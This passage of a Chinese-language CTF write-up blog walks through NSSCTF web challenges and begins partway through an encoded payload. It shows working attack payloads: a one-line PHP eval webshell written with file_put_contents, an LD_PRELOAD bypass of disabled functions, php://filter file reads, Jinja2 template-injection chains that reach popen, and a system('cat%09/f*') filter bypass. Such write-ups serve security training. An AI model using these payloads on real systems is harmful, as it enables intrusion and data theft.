class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>____<span class="token operator">.</span><span class="token operator">%</span><span class="token number">3</span>D<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>D<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">24</span>____<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">24</span>___<span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">5</span>B_<span class="token operator">%</span><span class="token number">5</span>D<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">3</span>B<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>post：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">_</span><span class="token operator">=</span><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>先看phpinfo</p>
<p>发现禁用了大量函数</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">pcntl_alarm<span class="token punctuation">,</span>pcntl_fork<span class="token punctuation">,</span>pcntl_waitpid<span class="token punctuation">,</span>pcntl_wait<span class="token punctuation">,</span>pcntl_wifexited<span class="token punctuation">,</span>pcntl_wifstopped<span class="token punctuation">,</span>pcntl_wifsignaled<span class="token punctuation">,</span>pcntl_wifcontinued<span class="token punctuation">,</span>pcntl_wexitstatus<span class="token punctuation">,</span>pcntl_wtermsig<span class="token punctuation">,</span>pcntl_wstopsig<span class="token punctuation">,</span>pcntl_signal<span class="token punctuation">,</span>pcntl_signal_get_handler<span class="token punctuation">,</span>pcntl_signal_dispatch<span class="token punctuation">,</span>pcntl_get_last_error<span class="token punctuation">,</span>pcntl_strerror<span class="token punctuation">,</span>pcntl_sigprocmask<span class="token punctuation">,</span>pcntl_sigwaitinfo<span class="token punctuation">,</span>pcntl_sigtimedwait<span class="token punctuation">,</span>pcntl_exec<span class="token punctuation">,</span>pcntl_getpriority<span class="token punctuation">,</span>pcntl_setpriority<span class="token punctuation">,</span>pcntl_async_signals<span class="token punctuation">,</span>system<span class="token punctuation">,</span>exec<span class="token punctuation">,</span>shell_exec<span class="token punctuation">,</span>popen<span class="token punctuation">,</span>proc_open<span class="token punctuation">,</span>passthru<span class="token punctuation">,</span>symlink<span class="token punctuation">,</span>link<span class="token punctuation">,</span>syslog<span class="token punctuation">,</span>imap_open<span class="token punctuation">,</span>ld<span class="token punctuation">,</span>dl<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>然后写马</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">_=file_put_contents('1.php','<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"shell"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span>')<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>连蚁剑</p>
<p><img src="/blog/2023/10/16/NSSCTF-web-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/image-20231020142912904.png" alt="image-20231020142912904"></p>
<p>php5.6.40，连上后用插件绕过disable_functions，选ldpreload</p>
<p><img src="/blog/2023/10/16/NSSCTF-web-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/image-20231020143151506.png" alt="image-20231020143151506"></p>
<p>上传成功后直接去根目录获取flag</p>
<hr>
<h1 id="NSSRound-8-Basic-MyDoor"><a href="#NSSRound-8-Basic-MyDoor" class="headerlink" title="[NSSRound#8 Basic]MyDoor"></a>[NSSRound#8 Basic]MyDoor</h1><blockquote>
<p>任意文件包含+非法传参</p>
</blockquote>
<p>进入题目，什么都没有</p>
<p>存在任意文件读取，先伪协议读一下index.php</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>file<span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment">//filter/read=convert.base64-encode/resource=index.php</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>base64解码一下</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'N_S.S'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'N_S.S'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Location:/index.php?file='</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\.\.|la|data|input|glob|global|var|dict|gopher|file|http|phar|localhost|\?|\*|\~|zip|7z|compress/is'</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">include</span> <span class="token variable">$file</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'error.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>直接看第一个if语句，非法传参命令执行即可</p>
<p>flag在phpinfo</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span><span class="token constant">N</span><span class="token punctuation">[</span><span class="token constant">S</span><span class="token operator">.</span><span class="token constant">S</span><span class="token operator">=</span><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<hr>
<h1 id="NCTF-2018-flask真香"><a href="#NCTF-2018-flask真香" class="headerlink" title="[NCTF 2018]flask真香"></a>[NCTF 2018]flask真香</h1><blockquote>
<p>ssti</p>
</blockquote>
<p>尝试切换demo页面，出现报错</p>
<p><img src="/blog/2023/10/16/NSSCTF-web-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/image-20231020150912261.png" alt="image-20231020150912261"></p>
<p>测试存在ssti注入</p>
<p><img src="/blog/2023/10/16/NSSCTF-web-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/image-20231020151015385.png" alt="image-20231020151015385"></p>
<p>手动fuzz一下，发现过滤了class，getattr，builtins，import，os，open</p>
<p>可以用字符串拼接来绕过</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token string">""</span><span class="token punctuation">[</span><span class="token string">'__cla'</span><span class="token string">'ss__'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>那么查找子类</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token string">""</span><span class="token punctuation">[</span><span class="token string">'__cla'</span><span class="token string">'ss__'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'__subcla'</span><span class="token string">'sses__'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>找到其中的<code>&lt;class &#39;os._wrap_close&#39;&gt;</code>类，不搓脚本的话善用ctrl+f找<code>&lt;</code></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token string">""</span><span class="token punctuation">[</span><span class="token string">'__cla'</span><span class="token string">'ss__'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'__subcla'</span><span class="token string">'sses__'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">399</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>然后命令执行即可</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token string">''</span><span class="token punctuation">[</span><span class="token string">'__cla'</span><span class="token string">'ss__'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'__subcla'</span><span class="token string">'sses__'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">399</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'pop'</span><span class="token string">'en'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'ls /'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<hr>
<h1 id="SWPUCTF-2022-新生赛-webdog1-start"><a href="#SWPUCTF-2022-新生赛-webdog1-start" class="headerlink" title="[SWPUCTF 2022 新生赛]webdog1__start"></a>[SWPUCTF 2022 新生赛]webdog1__start</h1><blockquote>
<p>信息泄露+rce+md5弱比较</p>
</blockquote>
<p>进入题目，ctrl+u查看页面源码，发现php源码</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'web'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token variable">$first</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'web'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$first</span><span class="token operator">==</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$first</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>md5弱比较，自身和md5后都是0e开头的字符串是<code>0e215962017</code></p>
<p>来到start.php，ctrl+u查看页面源码</p>
<p><img src="/blog/2023/10/16/NSSCTF-web-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/image-20231020163528521.png" alt="image-20231020163528521"></p>
<p>发现hint，应该是要我们看robots.txt</p>
<p>不知道为什么firefox这里中文乱码了，不过无所谓，告诉了我们下一步在f14g.php</p>
<p>访问&#x2F;f14g.php，在响应头发现hint</p>
<p><img src="/blog/2023/10/16/NSSCTF-web-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/image-20231020163826041.png" alt="image-20231020163826041"></p>
<p>访问&#x2F;F1l1l1l1l1lag.php，得到源码</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'get'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$get</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'get'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strstr</span><span class="token punctuation">(</span><span class="token variable">$get</span><span class="token punctuation">,</span><span class="token string double-quoted-string">" "</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$get</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">" "</span><span class="token punctuation">,</span> <span class="token variable">$get</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$get</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"This is too long."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>            
            <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
                <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$get</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token punctuation">&#125;</span> 
    <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nonono"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>过滤了空格，用%09绕过</p>
<p>过滤了flag，用通配符*读</p>
<p>payload：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">/</span>F1l1l1l1l1lag<span class="token operator">.</span>php<span class="token operator">?</span>get<span class="token operator">=</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'cat%09/f*'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<hr>
<h1 id="prize-p5"><a href="#prize-p5" class="headerlink" title="prize_p5"></a>prize_p5</h1><blockquote>
<p>反序列化字符串逃逸+原生类</p>
</blockquote>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">catalogue</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$class</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$data</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token keyword">class</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"error"</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"hacker"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token keyword">new</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token keyword">class</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">error</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$OTL</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token constant">OTL</span> <span class="token operator">=</span> <span class="token variable">$OTL</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"hello "</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token constant">OTL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">escape</span><span class="token punctuation">&#123;</span>                                                                   
    <span class="token keyword">public</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'OTL'</span><span class="token punctuation">;</span>                                                 
    <span class="token keyword">public</span> <span class="token variable">$phone</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'123666'</span><span class="token punctuation">;</span>                                             
    <span class="token keyword">public</span> <span class="token variable">$email</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'sweet@OTL.com'</span><span class="token punctuation">;</span>                          
<span class="token punctuation">&#125;</span>
<span class="token keyword">function</span> <span class="token function-definition function">abscond</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'NSS'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'CTF'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'OTL_QAQ'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'hello'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'|'</span><span class="token punctuation">,</span> <span class="token variable">$filter</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/i'</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$filter</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">,</span> <span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cata'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/object/i'</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cata'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cata'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$cc</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">catalogue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
        <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$cc</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           
    <span class="token punctuation">&#125;</span>    
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'phone'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'email'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag/i"</span><span class="token punctuation">,</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'email'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nonono,you can not do that!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token variable">$abscond</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">escape</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$abscond</span><span class="token operator">-></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$abscond</span><span class="token operator">-></span><span class="token property">phone</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'phone'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$abscond</span><span class="token operator">-></span><span class="token property">email</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'email'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$abscond</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$abscond</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$escape</span> <span class="token operator">=</span> <span class="token function">get_object_vars</span><span class="token punctuation">(</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">abscond</span><span class="token punctuation">(</span><span class="token variable">$abscond</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$escape</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'phone'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$escape</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'email'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"I'm sorry to tell you that you are wrong"</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
